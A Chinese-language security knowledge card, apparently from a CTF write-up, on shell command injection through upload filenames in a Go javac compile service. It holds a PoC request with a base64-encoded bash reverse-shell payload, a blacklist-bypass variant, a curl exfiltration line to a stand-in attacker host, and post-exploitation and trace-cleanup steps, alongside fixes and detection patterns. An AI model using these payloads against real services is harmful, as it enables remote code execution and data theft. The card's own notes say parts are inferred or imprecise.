---
id: web-golang-multipart-filename-javac-shell-command-injection
title: Go 上传编译服务把 multipart 文件名拼进 javac 命令行：文件名即命令注入
type: scenario
domain: web
path: web/golang
technique: go-multipart-filename-shell-command-injection-compile-service
aliases:
- javac 文件名命令注入
- 上传文件名进 os/exec
- Go 编译服务 RCE
- filename 拼接 shell
- 字符黑名单绕过命令注入
tags:
- go
- golang
- file-upload
- filename-injection
- command-injection
- os-exec
- javac
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W4
  verified_at: '2026-11-08T20:50:37+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文。正文 Go 源码只 upload 落盘，javac 编译调用为正文叙述推断，卡内已用「若拼进 shell」并写明前提；filename 黑名单不含空格与斜杠，「黑名单挡住空格/引号」的算子表述不精确，需按实际调用方式校准；.java 后缀 + 分号分隔 + base64|bash 的 PoC 与正文一致。
---

## 一句话结论

Go 写的「上传 .java 后调用 javac 编译」服务，若把 `handler.Filename` 直接拼进 `sh -c "javac <filename>"` 之类的命令行，文件名里的 `;`、`&&`、`$()` 就会变成命令分隔符；只用字符黑名单（如禁 `<>"'\?*{}` 与空白）挡一层，仍可用 `1;base64 -d|bash;1.java` 这种「文件名以 `.java` 结尾 + 中间夹分号」的形式完成任意命令执行。

## 原理

- **文件名是用户完全可控的字符串**：`multipart` 的 `filename` 由客户端随意填写，`r.FormFile("file")` 返回的 `handler.Filename` 只是原文，Go 标准库不会做 shell 转义。
- **拼接进 shell 就会解释元字符**：若服务端走 `exec.Command("sh", "-c", "javac "+filename)` 或把参数拼成一个字符串交给 shell，`;` 会截断命令、`|` 会接线、`$()` 与反引号会做命令替换。即使使用 `exec.Command("javac", filename)`（不经 shell），若文件名以 `-` 开头仍可能被当成 javac 选项（参数注入），但能执行任意命令的是前者。
- **黑名单为什么不够**：本题只禁 `< > " ' \ ? * { } \t \n \r` 这些字符，`;`、`|`、`&`、`$`、`(`、`)`、空格外的制表符以外分隔符都还能用；只要不用空白就能拼出完整命令（或用 `${IFS}`、`$'\t'` 之类替代空格）。
- **后缀校验可以被绕过**：`strings.HasSuffix(name, ".java")` 只要求结尾，前面可以任意长，所以 `1;payload;1.java` 既满足后缀又以分号分隔出真正的编译目标，让 javac 编译 `1.java` 不至于整条链报错中断。
- **为什么要 base64**：黑名单挡住了引号、空格和斜杠之外的一些符号，把反弹 shell 命令 base64 后仅用 `|base64 -d|bash` 三段即可，避免出现单引号、双引号与空格（base64 字母表天然安全）。
- **落盘位置次要**：这一步甚至不需要文件真的被保存成功——命令在 `io.Copy` 之前的 shell 阶段就已执行；即使保存失败返回 500，命令也已生效。

## 触发条件

- 服务端提供「上传源码 → 调用系统编译器（javac/gcc/go build 等）」的功能。
- 文件名（`handler.Filename` 或后端重命名用的字段）被拼接进 shell 命令行，而非以参数数组方式传递。
- 过滤只覆盖部分危险字符，未禁止 `;`、`|`、`&`、`$`、括号、换行等命令分隔/替换元字符，也未做重命名或白名单。
- 运行服务的用户可执行 shell 与目标命令（一般 Web 服务进程均可）。

## 利用步骤

1. 抓上传包，确认表单字段名（如 `file`）与后端对文件名的校验：后缀、字符黑名单、是否重命名。
2. 若走 shell 拼接，构造「满足后缀 + 含分隔符」的文件名：`1;<payload>;1.java`，payload 内避免黑名单字符。
3. 需要空格时用 `${IFS}`、`$'\t'` 或把整段命令 base64 后 `|base64 -d|bash`。
4. 用 DNSLog/HTTP 外带或直接反弹 shell 验证执行；无回显时先打外带确认，再拉长命令。
5. 上线后做基础信息收集（`id`、`sudo -l`、可读凭据文件），并注意清理上传目录里的载荷文件。

## PoC

```http
POST /gojava HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash;1.java"
Content-Type: application/java

class T { public static void main(String[] a) {} }
------x--
```

```text
预期：服务端执行 javac 时 shell 先跑 base64 解出的反弹 shell 命令，再执行 javac 1.java；
若 javac 报错返回 500，不影响前置命令已执行。
```

无空格、无引号的等价写法（黑名单更严时）：

```text
filename="1;echo${IFS}<base64>|base64${IFS}-d|bash;1.java"
```

## 变体与关联

- 变体（不经 shell 的参数注入）：`exec.Command("javac", filename)` 时文件名以 `-` 开头可注入 `-J` 等选项（如 `-J-Xbootclasspath`），危害低于命令执行但仍可影响编译行为；若后续流程把 class 文件放到可访问目录，可进一步做代码执行。
- 变体（其他编译服务）：同一原语适用于 `gcc`、`go build`、`mvn`、`dotnet build`、`tsc` 等任何「把用户文件名拼进命令行」的在线编译/预览服务。
- 变体（无回显）：改用 DNSLog（`curl http://$(id|base64).attacker`）或写入 Web 目录再访问。
- 关联：[[web-golang-build-env-cc-injection-command-exec]]（同一类「编译服务命令执行」，sink 是环境变量 `CC`）、[[upload-filename-param-rename-cmdi]]（重命名字段拼进系统命令的同族问题）。
- 边界：若服务端用参数数组调用、或用随机名重命名后再编译，文件名中的元字符不会被解释，该链失效；若容器内无 shell 且 `javac` 直接 exec，也无法拼接。

## 检测与防御

- 代码修复：绝不把用户文件名交给 shell；用 `exec.Command("javac", safePath)` 的参数数组形式，并对文件名做 `filepath.Base` + 白名单 `[A-Za-z0-9._-]` 重命名（如 UUID + `.java`）。
- 校验策略：黑名单必然漏字符，改为「重命名 + 后缀白名单 + 落盘目录限制在临时目录」；禁用 `sh -c` 拼接。
- 运行时缓解：编译在无网络、低权限的一次性容器内执行；限制出网与 `bash`/`curl` 可用性；Web 目录不可写。
- 检测：multipart filename 中出现 `;`、`|`、`&`、`$(`、`${IFS}`、`base64 -d`；Web 进程派生出 `bash`/`sh`/`javac` 之外的子进程；上传目录出现异常命名的 `.java` 文件。
